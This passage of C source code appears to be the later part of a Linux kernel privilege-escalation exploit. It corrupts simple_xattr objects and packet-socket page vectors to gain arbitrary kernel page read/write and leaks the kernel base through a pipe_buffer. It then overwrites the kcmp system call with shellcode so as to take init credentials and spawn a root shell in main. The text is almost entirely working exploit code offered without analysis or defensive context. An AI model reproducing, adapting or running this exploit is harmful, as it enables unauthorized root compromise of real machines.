			alloc_pages(fake_simple_xattr_packet_socket, 1, PAGES_ORDER2_SIZE);
			void *mem = Mmap(NULL, 1 * PAGES_ORDER2_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fake_simple_xattr_packet_socket, 0);
			strcpy(mem, DETECT_FAKE_SIMPLE_XATTR_RECLAIMATION);

			manipulated_simple_xattr->name = (void *)fake_simple_xattr_addr;
			getxattr_ret = getxattr(
				simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
				DETECT_FAKE_SIMPLE_XATTR_RECLAIMATION,
				value_get,
				manipulated_simple_xattr->size
			);

			if (getxattr_ret == manipulated_simple_xattr->size) {
				memset(mem, 0, 1 * PAGES_ORDER2_SIZE);
				struct simple_xattr *fake_simple_xattr = mem;
				fake_simple_xattr->list.next = (void *)fake_simple_xattr_addr;
				fake_simple_xattr->list.prev = (void *)fake_simple_xattr_addr;
				fake_simple_xattr->name = (void *)fake_simple_xattr_name_addr;
				fake_simple_xattr->size = KMALLOC_8K_SIZE;

				manipulated_simple_xattr->list.next = (void *)fake_simple_xattr_addr;
				fake_simple_xattr_success = true;
			}

			Munmap(mem, 1 * PAGES_ORDER2_SIZE);
			manipulated_simple_xattr->name = (void *)original_manipulated_simple_xattr_name_pointer;
		}

		fprintf(stderr, "fake_simple_xattr_success\n");

		Removexattr(
			simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
			FAKE_SIMPLE_XATTR_NAME
		);

		alloc_pages(overwritten_pg_vec_packet_socket, MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2, PAGE_SIZE);
		void *mem = mmap(NULL, 1 * PAGES_ORDER2_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fake_simple_xattr_name_packet_socket, 0);
		void *mem1 = mmap(NULL, 1 * PAGES_ORDER2_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fake_simple_xattr_packet_socket, 0);
		struct pgv *pgv = NULL;

		if (mem != MAP_FAILED && is_data_look_like_pgv(mem, MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2)) {
			abr_page_read_write_primitive->packet_socket_to_overwrite_pg_vec = fake_simple_xattr_name_packet_socket;
			pgv = mem;
			abr_page_read_write_primitive->original_buffer_page_addr = (u64)(pgv[0].buffer);
			abr_page_read_write_primitive_build_success = true;
		} else if (mem1 != MAP_FAILED && is_data_look_like_pgv(mem1, MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2)) {
			abr_page_read_write_primitive->packet_socket_to_overwrite_pg_vec = fake_simple_xattr_packet_socket;
			pgv = mem1;
			abr_page_read_write_primitive->original_buffer_page_addr = (u64)(pgv[0].buffer);
			abr_page_read_write_primitive_build_success = true;
		}

		if (mem != MAP_FAILED)
			Munmap(mem, 1 * PAGES_ORDER2_SIZE);

		if (mem1 != MAP_FAILED)
			Munmap(mem1, 1 * PAGES_ORDER2_SIZE);

		if (abr_page_read_write_primitive_build_success) {
			abr_page_read_write_primitive->packet_socket_with_overwritten_pg_vec = overwritten_pg_vec_packet_socket;
			abr_page_read_write_primitive->overwrite_pg_vec_mmap_size = 1 * PAGES_ORDER2_SIZE;
			abr_page_read_write_primitive->overwritten_pg_vec_mmap_size = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_PAGES_ORDER2 * PAGE_SIZE;
		} else {
			free_pages(overwritten_pg_vec_packet_socket);
		}
	}

	manipulated_simple_xattr->list.next = (void *)original_manipulated_simple_xattr_list_next_pointer;
	simple_xattr_read_write_primitive_munmap(simple_xattr_read_write_primitive);
}

struct simple_xattr_read_write_primitive simple_xattr_read_write_primitive_build(
	struct necessary_threads *necessary_threads,
	int configure_network_interface_socket,
	int timerfd,
	struct pages_order2_read_primitive *pages_order2_read_primitive
)
{
	struct simple_xattr_read_write_primitive simple_xattr_read_write_primitive = {};
	simple_xattr_read_write_primitive_init(&simple_xattr_read_write_primitive);

	struct timespec simple_xattr_read_write_primitive_sleep_decrease_amplitude = { .tv_nsec = 10000 };
	struct timespec simple_xattr_read_write_primitive_timer_interrupt_amplitude = { .tv_nsec = 130000 };
	pages_order2_read_primitive_build_leaked_simple_xattr(pages_order2_read_primitive);

	bool simple_xattr_read_write_primitive_build_success = false;
	while (!simple_xattr_read_write_primitive_build_success) {
		simple_xattr_read_write_primitive_build_success = simple_xattr_read_write_primitive_build_primitive(
			&simple_xattr_read_write_primitive,
			pages_order2_read_primitive,
			necessary_threads,
			timerfd,
			configure_network_interface_socket,
			simple_xattr_read_write_primitive_sleep_decrease_amplitude,
			simple_xattr_read_write_primitive_timer_interrupt_amplitude
		);
	}

	return simple_xattr_read_write_primitive;
}

void *abr_page_read_write_primitive_mmap(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	u64 page_aligned_addr_to_mmap
)
{
	if (page_aligned_addr_to_mmap & (PAGE_SIZE - 1)) {
		fprintf(stderr, "[abr_page_read_write_primitive_mmap]: page_aligned_addr_to_mmap is not page aligned\n");
		return NULL;
	}

	void *mem = Mmap(
		NULL,
		abr_page_read_write_primitive->overwrite_pg_vec_mmap_size,
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		abr_page_read_write_primitive->packet_socket_to_overwrite_pg_vec,
		0
	);

	struct pgv *pgv = mem;
	pgv[0].buffer = (char *)page_aligned_addr_to_mmap;
	Munmap(mem, abr_page_read_write_primitive->overwrite_pg_vec_mmap_size);

	mem = mmap(
		NULL,
		abr_page_read_write_primitive->overwritten_pg_vec_mmap_size,
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		abr_page_read_write_primitive->packet_socket_with_overwritten_pg_vec,
		0
	);

	if (mem == MAP_FAILED)
		return NULL;

	return mem;
}

void abr_page_read_write_primitive_munmap(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	void *mem
)
{
	Munmap(mem, abr_page_read_write_primitive->overwritten_pg_vec_mmap_size);
	mem = Mmap(
		NULL,
		abr_page_read_write_primitive->overwrite_pg_vec_mmap_size,
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		abr_page_read_write_primitive->packet_socket_to_overwrite_pg_vec,
		0
	);

	struct pgv *pgv = mem;
	pgv[0].buffer = (char *)abr_page_read_write_primitive->original_buffer_page_addr;
	Munmap(mem, abr_page_read_write_primitive->overwrite_pg_vec_mmap_size);
}

void *patch_sys_kcmp(struct abr_page_read_write_primitive *abr_page_read_write_primitive)
{
	u64 sys_kcmp_page = __do_sys_kcmp & PAGE_MASK;
	u64 sys_kcmp_offset_from_page = __do_sys_kcmp - sys_kcmp_page;

	void *m = abr_page_read_write_primitive_mmap(
		abr_page_read_write_primitive,
		sys_kcmp_page
	);

	void *overwrite_ptr = m + sys_kcmp_offset_from_page;
	void *shellcode = (void *)privilege_escalation_shellcode_begin;
	int shellcode_length = (void *)privilege_escalation_shellcode_end - (void *)privilege_escalation_shellcode_begin;
	void *saved_opcodes = Calloc(1, shellcode_length);
	memcpy(saved_opcodes, overwrite_ptr, shellcode_length);
	memcpy(overwrite_ptr, shellcode, shellcode_length);

	abr_page_read_write_primitive_munmap(abr_page_read_write_primitive, m);
	return saved_opcodes;
}

u64 find_kernel_base(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	struct simple_xattr_read_write_primitive *simple_xattr_read_write_primitive
)
{
	pin_thread_on_cpu(CPU_NUMBER_ZERO);
	struct simple_xattr *manipulated_simple_xattr = simple_xattr_read_write_primitive_mmap(simple_xattr_read_write_primitive);
	
	u64 kernel_base = 0;
	bool found_pipe_buffer = false;

	while (!found_pipe_buffer) {
		int pipe_fd[2] = {};
		Pipe2(pipe_fd, O_DIRECT);

		u8 value[XATTR_SIZE_MAX] = {};
		Setxattr(
			simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
			LEAKED_PAGES_ORDER2_ADDRESS_FOR_PIPE_BUFFER_SIMPLE_XATTR_NAME,
			value,
			KMALLOC_8K_SIZE,
			XATTR_CREATE
		);

		u64 pipe_buffer_addr = (u64)manipulated_simple_xattr->list.prev;
		fprintf(stderr, "pipe_buffer_addr: 0x%016lx\n", pipe_buffer_addr);

		Removexattr(
			simple_xattr_read_write_primitive->manipulated_simple_xattr_request->filepath,
			LEAKED_PAGES_ORDER2_ADDRESS_FOR_PIPE_BUFFER_SIMPLE_XATTR_NAME
		);

		Fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_COUNT_TO_ALLOCATE_PIPE_BUFFER_ON_PAGES_ORDER2 * PAGE_SIZE);
		Write(pipe_fd[1], DATA_TO_TRIGGER_PIPE_BUFFER_FILLIN, strlen(DATA_TO_TRIGGER_PIPE_BUFFER_FILLIN));

		void *mem = abr_page_read_write_primitive_mmap(abr_page_read_write_primitive, pipe_buffer_addr);
		if (mem != NULL) {
			if (is_data_look_like_pipe_buffer(mem)) {
				struct pipe_buffer *pipe_buffer = mem;
				kernel_base = (u64)pipe_buffer->ops - anon_pipe_buf_ops_offset_from_kernel_base;
				found_pipe_buffer = true;
			}

			abr_page_read_write_primitive_munmap(abr_page_read_write_primitive, mem);
		}

		Close(pipe_fd[0]);
		Close(pipe_fd[1]);
	}

	simple_xattr_read_write_primitive_munmap(simple_xattr_read_write_primitive);
	return kernel_base;
}

int main(void)
{
	setup_nofile_rlimit();
	setup_namespace();
	setup_tmpfs();

	int timerfd = Timerfd_create(CLOCK_MONOTONIC, 0);
	struct necessary_threads *necessary_threads = necessary_threads_create(timerfd);

	dummy_network_interface_create(DUMMY_INTERFACE_NAME, IPV6_MIN_MTU - 1);
	int configure_network_interface_socket = Socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	network_interface_up(configure_network_interface_socket, DUMMY_INTERFACE_NAME);

	struct pages_order2_read_primitive pages_order2_read_primitive = pages_order2_read_primitive_build(
		necessary_threads,
		configure_network_interface_socket,
		timerfd
	);

	fprintf(stderr, "pages_order2_read_primitive build success\n");
	
	struct simple_xattr_read_write_primitive simple_xattr_read_write_primitive = simple_xattr_read_write_primitive_build(
		necessary_threads,
		configure_network_interface_socket,
		timerfd,
		&pages_order2_read_primitive
	);

	fprintf(stderr, "simple_xattr_read_write_primitive build success\n");

	struct abr_page_read_write_primitive abr_page_read_write_primitive = {};
	abr_page_read_write_primitive_build_primitive(
		&abr_page_read_write_primitive,
		&simple_xattr_read_write_primitive,
		&pages_order2_read_primitive
	);

	fprintf(stderr, "abr_page_read_write_primitive_build_primitive success\n");

	u64 kernel_base = find_kernel_base(&abr_page_read_write_primitive, &simple_xattr_read_write_primitive);
	fprintf(stderr, "[+] kernel base: 0x%016lx\n", kernel_base);
	update_kernel_address(kernel_base);
	void *sys_kcmp_saved_opcodes = patch_sys_kcmp(&abr_page_read_write_primitive);

	int not_used = -1;
	syscall(SYS_kcmp, (u32)(init_cred >> 32), (u32)(init_cred), not_used, init_fs, __x86_return_thunk);

	char *sh_args[] = {"sh", NULL};
	execve("/bin/sh", sh_args, NULL);
}
